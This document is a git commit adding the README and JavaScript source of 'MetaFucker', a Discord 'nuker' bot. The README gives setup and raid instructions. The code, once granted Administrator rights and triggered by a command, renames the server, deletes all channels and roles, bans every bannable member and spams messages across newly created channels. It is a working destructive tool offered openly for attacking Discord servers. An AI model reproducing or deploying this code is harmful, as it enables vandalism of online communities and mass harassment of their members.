7c387c24d93de3b4ae84a3861a0f0c64a7fa0e14
ProGamerYT2255 <140811495+MetaServices092@users.noreply.github.com>
2023-07-28 15:33:43 +0430

    No title
    No description

--- README.md
+++ README.md
@@ -1,2 +1,34 @@
 # MetaFucker
- Discord powerful nuker made by BedlessFighter [ @bedlessfighter. ]
+```Discord powerful nuker programmed by BedlessFighter [ @bedlessfighter. ] using JavaScript programming language.```
+-
+      This thing ain't joke and I'm not responsive for any damages made to any servers.
+# Configs
+```Config the bot through "config.json"```
+-
+# Config parameters
+
+    user_id ==> Your discord user ID. ( you can get it through developer mode by right clicking on your user and pressing "Copy user ID" )
+
+    channel_name ==> Channels name which bot is going to create them later in the attack.
+
+    server_name ==> The name of the server which server's name gonna rename to it later in the attack.
+
+    message ==> The message which the bot's gonna spam it later in all channels.
+
+    bot_token ==> Your robot's token ( You can make a bot through https://discord.com/developers and get the token from it )
+
+    bot_prefix ==> The commands that is gonna execute the process. Let it default for "meta!".
+
+    bot_status ==> The status which bot's gonna set a RPC status " Playing [ your custom status ] ".
+
+# How to start the robot ?
+- If you don't have NodeJS, install it through " https://nodejs.org/ ".
+- Edit [ config.json ] using nodepad or something else.
+- use [ node . ] command in the folder's command line or VSCode terminal.
+# How to start the raid ?
+- After starting the bot, give the robot Administrator permissions and send in command. If you set a custom prefix like hello!, your command is: hello!auto. if not, your default command is: meta!auto.
+
+```MetaServices - All rights reversed```
+-
+```Copyright MetaServices - https://discord.gg/bvbqCMjm```
+-
---
+++ index.js
@@ -0,0 +1,125 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const config = require("./config.json");
+
+client.once("ready", () => {
+  console.log(`We're Logged As ${client.user.username}!`);
+  client.user.setPresence({
+    status: "dnd",
+    activity: {
+      name: config.bot_settings.bot_status,
+      type: "PLAYING",
+    },
+  });
+});
+
+let prefix = config.bot_settings.bot_prefix;
+
+client.on("message", async (message) => {
+  const a = [1];
+  // Spammer Codes
+  if ("spam".includes(message.content)) {
+      message.delete()
+      for (let index = 0; index < a.length; index++) {
+      message.guild.channels.cache.forEach((channel) => {
+        channel.send(config.nuke_settings.message).catch((err) => console.log(" "));
+        let everyoneRole = message.guild.roles.cache.find(
+          (r) => r.name === "@everyone"
+        );
+        message.guild.channels.create(config.nuke_settings.channel_name, {
+          type: "text",
+          permissionOverwrites: [
+            {
+              id: everyoneRole.id,
+              allow: ["VIEW_CHANNEL"],
+            },
+          ],
+        });
+      });
+    }
+  } else if (config.nuke_settings.message.includes(message.content)) {
+    for (let index = 0; index < a.length; index++) {
+      message.guild.channels.cache.forEach((channel) => {
+        channel.send(config.nuke_settings.message).catch((err) => console.log(" "));
+        let everyoneRole = message.guild.roles.cache.find(
+          (r) => r.name === "@everyone"
+        );
+        message.guild.channels.create(config.nuke_settings.channel_name, {
+          type: "text",
+          permissionOverwrites: [
+            {
+              id: everyoneRole.id,
+              allow: ["VIEW_CHANNEL"],
+              deny: ["SEND_MESSAGES"],
+            },
+          ],
+        });
+      });
+    }
+  }
+
+  // All Nuker Commands
+  if (message.content.startsWith(prefix)) {
+    const args = message.content.slice(prefix.length).split(/ +/);
+    const command = args.shift().toLowerCase();
+    if (command == "auto" && !message.author.bot) {
+      message.delete()
+      // Codes Nuker
+
+      message.guild.setName(config.nuke_settings.server_name);
+      message.guild.channels.cache.forEach((channel) => {
+        if (channel.name == config.nuke_settings.channel_name) return;
+        channel.delete().catch((error) => {
+          console.log(`:x: Couldn't delete ${channel.name}.`);
+        });
+
+        // channel creator
+
+        let everyoneRole = message.guild.roles.cache.find(
+          (r) => r.name === "@everyone"
+        );
+
+        message.guild.channels.create(config.nuke_settings.channel_name, {
+          type: "text",
+          permissionOverwrites: [
+            {
+              id: everyoneRole.id,
+              allow: ["VIEW_CHANNEL"],
+            },
+          ],
+        });
+      });
+
+      // Member Banner
+
+      message.guild.members.cache.forEach((member) => {
+        if (!member.bannable)
+          return console.log(`:x: Cannot ban ${member.user.username}`);
+        if (member.id == config.user_settings.you_user_id) return;
+        member.ban();
+        console.log(`Banned ${member.user.username}`);
+      });
+
+      const roles = message.guild.roles.cache;
+
+      roles.forEach((role) => {
+        if (role.editable && role.name !== message.guild.roles.everyone.name) {
+          role.delete().then((deleted) => console.log(`Deleted ${role.name}`));
+        } else {
+          console.log(`Cannot Delete ${role.name}`);
+        }
+      });
+      message.channel.send("spam")
+      // Nuke/Spam Disabler
+    } else if (command == "disable") {
+      message.channel.send("Destroied The Bot's Process.");
+      client.user.setStatus("offline");
+      client.destroy();
+    }
+  }
+});
+client.login(config.bot_settings.bot_token).catch((_) => {
+  // Checks if its unknown
+
+  console.error(`[ERR] Robot's token is expired or it's invaild! Double check it.`);
+});
